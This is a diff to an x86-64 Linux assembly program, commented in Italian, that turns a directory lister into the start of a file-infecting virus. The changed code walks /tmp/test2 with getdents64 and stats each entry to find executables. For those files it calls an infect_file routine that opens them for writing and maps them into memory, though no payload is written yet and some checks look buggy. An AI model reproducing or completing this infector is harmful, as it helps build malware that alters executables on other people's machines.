@@ -8,7 +8,7 @@
 ; .-----------.-------.
 ; |   Stack   | bytes |
 ; :-----------+-------:
-; | buffer    |  4096 |
+; | stat      |  4096 |
 ; :-----------+-------:
 ; | tot letto |     8 |
 ; :-----------+-------:
@@ -68,29 +68,38 @@ _start:
     mov dword [rsp+4], '/tes'
     mov dword [rsp], '/tmp'
 
-    sub rsp, 16                       ; riservo spazio per /tmp/test1
+    sub rsp, 16                       ; riservo spazio per /tmp/test2
     mov dword [rsp+8], `t2/\0`
     mov dword [rsp+4], '/tes'
     mov dword [rsp], '/tmp'
 
     mov rdi, rsp
     add rdi, 16                       ; passo come argomento /tmp/test/
-    call open_dir
+    call chdir
+
+    mov rdi, rsp
+    add rdi, 16                       ; passo come argomento /tmp/test/
+    mov rsi, 0
+    call open
     test rax, rax
     js exit
-    push rax                         ; salvo nello stack fd cartella
+    push rax                          ; salvo nello stack fd cartella
 
-    sub rsp, 32768                   ; riservo spazio nello stack per lettura getdents64
-    mov rdi, rsp                     ; passo come argomento lo spazio riservato
+    sub rsp, 32768                    ; riservo spazio nello stack per lettura getdents64
+    mov rdi, rsp                      ; passo come argomento lo spazio riservato
     call getdents64
-    push rax                         ; salvo nello stack totale letto da getdents64
+    push rax                          ; salvo nello stack totale letto da getdents64
 
-    sub rsp, 4096                    ; riservo spazio per il buffer
-    mov r10, rsp                     ; r10 = puntatore buffer
+    mov rdi, [rsp+32768+8]
+    call closefd                      ; chiudo fd cartella
+
+    sub rsp, 4096                     ; riservo spazio per stat
+    mov r10, rsp                      ; r10 = puntatore stat
     mov rdi, rsp
-    add rdi, 4104                    ; rdi = puntatore struct
+    add rdi, 4104                     ; rdi = puntatore struct
     call loop_indir
 
+;-----------------------------DEBUG-----------------------------
     mov rdi, 1
     mov rsi, rsp
     add rsi, 4096
@@ -101,47 +110,138 @@ _start:
     mov rax, 1
     syscall
 
+    mov rdi, 1
+    mov rsi, rsp
+    add rsi, 4096
+    add rsi, 8
+    add rsi, 32768
+    add rsi, 8
+    add rsi, 16
+    mov rdx, 10
+    mov rax, 1
+    syscall
+;---------------------------------------------------------------
+
 exit:
-    mov rsp, rbp                     ; ripristino lo stack
-    mov rdi, 0                       ; error code
+    mov rsp, rbp                      ; ripristino lo stack
+    mov rdi, 0                        ; error code
     mov rax, 60
     syscall
 
-open_dir:                            ; rdi = fd
-    mov rsi, 0                       ; permessi
-    mov rdx, 0                       ; flag
+open:                                 ; rdi = fd, rsi = permessi
+    mov rdx, 0                        ; flag
     mov rax, 2
     syscall
     ret
 
 getdents64:
-    mov rsi, rdi                     ; struct linux_dirent64 *dirent
-    mov rdi, [rsp+32768+8]           ; fd
-    mov rdx, 32768                   ; quantità da leggere
+    mov rsi, rdi                      ; struct linux_dirent64 *dirent
+    mov rdi, [rsp+32768+8]            ; fd
+    mov rdx, 32768                    ; quantità da leggere
     mov rax, 217
     syscall
     ret
 
-loop_indir:                          ; rdi = ptr struct, r10 = puntatore buffer
-    mov rax, [rsp+4096+8]            ; rax = tot letto
+closefd:                              ; rdi = fd
+    mov rax, 3
+    syscall
+    ret
+
+loop_indir:                           ; rdi = ptr struct, r10 = puntatore buffer
+    mov rax, [rsp+4096+8]             ; rax = tot letto
     .loop:
-        mov rsi, [rdi+dirent.d_name] ; ptr + d_name
-        cmp esi, 0x002e2e
-        je .print
-        cmp si, 0x002e
-        je .print
+        mov rsi, [rdi+dirent.d_name]  ; ptr + d_name
+        cmp esi, 0x002e2e             ; controllo se si tratta di '..'
+        je .continue
+        cmp si, 0x002e                ; controllo se si tratta di '.'
+        je .continue
+
+    .check:
+        push rax
+        push rdi
+        push rsi
+        push rdx
+        push r10
+        mov rdi, rdi
+        add rdi, dirent.d_name        ; rdi = ptr nome file
+        mov rsi, r10
+        mov rax, 4
+        syscall
+        xor rax, rax
+        mov rcx, [rsi+24]             ; rcx = st_mode
+        mov si, 1                     ; rsi = 1
+        test rcx, 1b                  ; verifico la flag se è eseguibile
+        cmove ax, si                  ; ax == 0 è eseguibile
+        cmp ax, 0
+        jne .restore
+
+        .infect:
+            call infect_file          ; rdi = ptr nome file
+            pop r10
+            pop rdx
+            pop rsi
+            pop rdi
+            pop rax
+            jmp .continue
+
+        .restore:
+            pop r10
+            pop rdx
+            pop rsi
+            pop rdi
+            pop rax
+    .continue:
         mov dx, [rdi+dirent.d_reclen]
         add rdi, rdx
         sub rax, rdx
         cmp rax, 0
         je .end
         jmp .loop
-    .print:
-        mov rdi, 1
-        mov rsi, rdi
-        add rsi, dirent.d_name
-        mov rdx, 2
-        mov rax, 1
-        syscall
     .end:
+        ret
+
+chdir:
+    mov rax, 80
+    syscall
+    ret
+
+lseek:                                ; rdi = fd
+    xor rsi, rsi
+    mov rdx, 2
+    mov rax, 8
+    syscall
+    ret
+
+mmap:                                 ; rsi = size, r8 = fd
+    xor rdi, rdi
+    mov rdx, 3
+    mov r10, 1
+    xor r9, r9
+    mov rax, 9
+    syscall
+    ret
+
+infect_file:                          ; rdi = ptr nome file
+; open
+    mov rsi, 1026
+    call open                         ; rax = fd
+; lseek
+    push rax
+    push rdi
+    mov rdi, rax
+    call lseek
+    mov rsi, rax                      ; rsi = size file
+    pop rdi
+    pop rax
+; mmap
+    mov r8, rax
+    push rax
+    call mmap
+    cmp rax, 0
+    jb exit
+    mov r10, rax                      ; r10 = ptr map
+    pop rax
+; close
+    mov rdi, rax
+    call closefd
     ret
